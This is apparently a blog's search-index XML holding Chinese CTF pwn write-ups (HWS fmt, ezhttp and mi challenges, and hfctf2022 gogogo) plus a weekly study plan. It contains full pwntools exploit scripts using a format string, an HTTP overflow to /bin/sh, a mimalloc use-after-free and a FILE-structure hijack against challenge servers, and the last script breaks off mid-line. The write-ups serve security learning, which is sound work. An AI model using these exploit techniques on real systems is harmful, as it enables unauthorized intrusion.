<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HWS-PWN</title>
    <link href="/2023/07/17/HWS-PWN/"/>
    <url>/2023/07/17/HWS-PWN/</url>
    
    <content type="html"><![CDATA[<p>这次有幸能将三道pwn题都解出了，第一天上大分，但只会解pwn，第二天不断掉分😢。</p><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>白给的两次格式化字符串漏洞，最后改__libc_start_main为one_ganget即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;fmt&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./fmt&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30050</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;%18$p,%21$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xe3b01</span><br>fmt_payload = fmtstr_payload(<span class="hljs-number">6</span>, &#123;(stack + <span class="hljs-number">8</span>) : one_gadget &amp; <span class="hljs-number">0xffffff</span>&#125;,  write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>payload = fmt_payload[:<span class="hljs-number">7</span>] + <span class="hljs-string">b&#x27;hh&#x27;</span> + fmt_payload[<span class="hljs-number">9</span>:]<br><span class="hljs-comment"># print(fmt_payload)</span><br><span class="hljs-comment"># print(payload)</span><br><span class="hljs-comment"># print(hex(one_gadget))</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                               </p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>虽然限制了<code>..</code> 符号的使用，但是在sub_1766函数中有个转base64的操作，大小没有限制，可以直接溢出到haystack，再利用<code>?</code> 去绕过文件后缀名的检测，最后利用sub_2993函数中的execl去执行<code>/bin/sh</code></p><img src="/img/16/Screenshot 2023-07-16 122048.png" style="zoom:80%;" /><p>​                              </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#p = remote(&#x27;127.0.0.1&#x27;, 4000)</span><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30092</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">b&#x27;GET / HTTP/1.1\r\n&#x27;</span><br>msg = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;/../../../bin/sh?faker.js&#x27;</span><br>payload += <span class="hljs-string">b&#x27;Authorization: Basic &#x27;</span> + base64.b64encode(msg) + <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br>pause()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)<br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                                         </p><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>白给的uaf，主要是mimalloc的问题，随便试了一下，堆分配是将一块连续的内存（0x10000）划分为相同的大小的chunk，有点像slab。</p><p>与glibc不同，同一大小的堆块分配chunk的链表和释放chunk的链表是不同的，只有当分配chunk的链表中的chunk用尽了，才去使用释放chunk的链表（语言表述可能有点问题，如果没有get到我说的点，就多调试一下吧）。</p><img src="/img/16/Screenshot 2023-07-16 125025.png" style="zoom:80%;" /><p>先泄漏堆地址，在堆基址+0x240处有libmimalloc.so.2的地址，偏移与glibc固定，泄漏后改IO_2_1_stdout，利用house of cat去栈迁移。</p><p>libmimalloc.so.2和glibc的偏移本地和远程不一样，还要去爆破这个偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#p = remote(&#x27;60.204.140.184&#x27;,30175)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    add(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        delete(i)<br><br>    show(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x30780</span><br><br>    add(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">5</span>)<br>    edit(<span class="hljs-number">4</span>, p64(heap_addr + <span class="hljs-number">0x2c0</span>))<br>    add(<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">0x310</span>, p64(heap_addr + <span class="hljs-number">0x240</span>))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    show(<span class="hljs-number">7</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-comment">#libcbase = leak - 0x22820 - 0x1f4000</span><br>    <span class="hljs-comment">#libcbase = leak - 0x228820 - i * 0x20</span><br>    libcbase = leak - <span class="hljs-number">0x22820</span> - <span class="hljs-number">0x1f4000</span> + <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x400</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        delete(i + <span class="hljs-number">9</span>)<br><br><br>    IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    pop_rdi_ret = libcbase + <span class="hljs-number">0x23b6a</span><br>    pop_rsi_ret = libcbase + <span class="hljs-number">0x2601f</span><br>    pop_rdx_ret = libcbase + <span class="hljs-number">0x142c92</span><br>    magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br>    <span class="hljs-comment">#fake_addr = IO_2_1_stdout</span><br><br>    faker_addr = heap_addr + <span class="hljs-number">0x50c80</span><br>    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) <br>    payload += p64(faker_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdi_ret + <span class="hljs-number">1</span>)<br>    payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>    payload += flat(<br>        pop_rdi_ret, ((faker_addr + <span class="hljs-number">0x100</span>) &gt;&gt; <span class="hljs-number">12</span>) &lt;&lt; <span class="hljs-number">12</span>,<br>        pop_rsi_ret, <span class="hljs-number">0x2000</span>,<br>        pop_rdx_ret, <span class="hljs-number">7</span>,<br>        libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>],<br>        faker_addr + <span class="hljs-number">0x140</span><br>    )<br>    payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><br>    edit(<span class="hljs-number">12</span>, p64(IO_2_1_stdout))<br>    add(<span class="hljs-number">0x400</span>, payload)<br><br>    fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x50c80</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>    fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE += p64(heap_addr)<br>    fake_IO_FILE += p64(magic_gadget)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>    fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>    fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    add(<span class="hljs-number">0x400</span>, fake_IO_FILE)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30191</span>)<br><span class="hljs-comment">#p = remote(&#x27;172.17.0.1&#x27;, 9999)</span><br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>exp()<br>p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每周计划&amp;&amp;每周总结</title>
    <link href="/2023/07/16/%E6%AF%8F%E5%91%A8%E8%AE%A1%E5%88%92/"/>
    <url>/2023/07/16/%E6%AF%8F%E5%91%A8%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<p>督促自己别摆烂。</p><h3 id="2023-7-17-2023-7-23"><a href="#2023-7-17-2023-7-23" class="headerlink" title="2023.7.17-2023.7.23"></a>2023.7.17-2023.7.23</h3><ul><li>复现至少4道近年来大型ctf比赛的pwn题</li><li>学习固件解密</li><li>熟记星火英语六级词汇中的两个list（大二都结束了，六级还没有过）</li><li>有时间看看v8的漏洞（主要好奇js洞是咋样的，当然不一定学得下去）</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hfctf2022</title>
    <link href="/2023/07/06/hfctf2022/"/>
    <url>/2023/07/06/hfctf2022/</url>
    
    <content type="html"><![CDATA[<p>今年的天津市的ctf比赛竟然使用奇安信的平台，想到去年的市赛不知道用谁家的平台，连个pwn的靶机都没搞好，体验巨差，今年奇安信的平台就非常舒服。</p><p>天津市的ctf比赛全是入门题，没什么可说的。后来我看到奇安信的平台上还有存有去年虎符ctf的题，自己就试着复现一下。</p><p>网上其他师傅也都复现过，建议直接看这些师傅的博客：</p><p><a href="https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/">https://kpwnz.github.io/2022/03/23/%E8%99%8E%E7%AC%A62022-pwn-%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://bbs.kanxue.com/thread-271978.htm">https://bbs.kanxue.com/thread-271978.htm</a></p><p><a href="https://www.xi4oyu.top/cdcd3a27">https://www.xi4oyu.top/cdcd3a27</a></p><p>​                                                                                     </p><h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p>真佩服出题人的脑洞，拿个main__main函数迷惑你，真正的主函数是math_init函数，里面的字符串竟然是由一个一个字母打印出来的</p><img src="/img/15/Screenshot 2023-07-10 141548.png" style="zoom:80%;" /><p>这里参考了一下<a href="https://www.hex-rays.com/products/ida/support/idadoc/1361.shtml">ida的user_call教程</a>，改变一下函数参数调用规则，让伪代码更好看。最后的漏洞是在通过BULLS AND COWS的游戏后进入exit选项后的栈溢出（正常人哪想得到）。</p><p>最后的exp参考了<a href="https://blog.csdn.net/weixin_44946764/article/details/125211885">这篇博客的BULLS AND COWS的解法</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;gogogo&#x27;</span>)<br><span class="hljs-comment">#sh = process(&#x27;./gogogo&#x27;)</span><br>sh = remote(<span class="hljs-string">&#x27;112.74.186.148&#x27;</span>, <span class="hljs-number">49363</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#p.sendlineafter(b&#x27;:&#x27;, b&#x27;305419896&#x27;)</span><br><span class="hljs-comment">#p.sendlineafter(b&#x27;:&#x27;, b&#x27;1717986918&#x27;)</span><br>sh.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1416925456&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;GUESS\n&#x27;</span>)<br>li = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>]<br>guessli = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> li:<br>        <span class="hljs-keyword">if</span> u == i:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> li:<br>            <span class="hljs-keyword">if</span> u == o <span class="hljs-keyword">or</span> o == i:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> li:<br>                <span class="hljs-keyword">if</span> p == o <span class="hljs-keyword">or</span> p == u <span class="hljs-keyword">or</span> p == i:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">else</span>:<br>                    four = p<br>                    guessli.append([i,u,o,p])<br><br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> guess <span class="hljs-keyword">in</span> guessli:<br>    total += <span class="hljs-number">1</span><br>    time.sleep(<span class="hljs-number">1</span>)<br>    num = <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">0</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">1</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">2</span>]) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(guess[<span class="hljs-number">3</span>])<br>    <span class="hljs-comment">#print(num)</span><br>    sh.sendline(num.encode())<br>    recv = sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;YOU WIN\n&#x27;</span> <span class="hljs-keyword">in</span> recv:<br>        <span class="hljs-keyword">break</span><br>    A = <span class="hljs-built_in">int</span>(recv[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>], <span class="hljs-number">10</span>)<br>    B = <span class="hljs-built_in">int</span>(recv[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>], <span class="hljs-number">10</span>)<br>    A = <span class="hljs-built_in">str</span>(A)<br>    B = <span class="hljs-built_in">str</span>(B)<br>    <span class="hljs-keyword">if</span>(total == <span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">break</span><br>    guessli.remove(guess)<br>    <span class="hljs-comment">#print(guessli)</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.isdigit(A) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(A) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>.isdigit(B) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(B) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(A)+<span class="hljs-built_in">int</span>(B) &lt;= <span class="hljs-number">4</span> :<br>                A = <span class="hljs-built_in">int</span>(A)<br>                B = <span class="hljs-built_in">int</span>(B)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> A == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> B == <span class="hljs-number">0</span> :<br>        guesslis = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslis:<br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> item <span class="hljs-keyword">or</span> guess[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> item:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">elif</span> A == <span class="hljs-number">0</span>:<br>        guesslia = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslia:<br>            <span class="hljs-keyword">if</span> item[<span class="hljs-number">0</span>] == guess[<span class="hljs-number">0</span>] :<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">1</span>] == guess[<span class="hljs-number">1</span>]:<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">2</span>] == guess[<span class="hljs-number">2</span>]:<br>                guessli.remove(item)<br>            <span class="hljs-keyword">elif</span> item[<span class="hljs-number">3</span>] == guess[<span class="hljs-number">3</span>]:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">if</span> A + B &gt; <span class="hljs-number">0</span>:<br>        guesslib = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslib:<br>            count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> item :<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> item:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> item:<br>                count 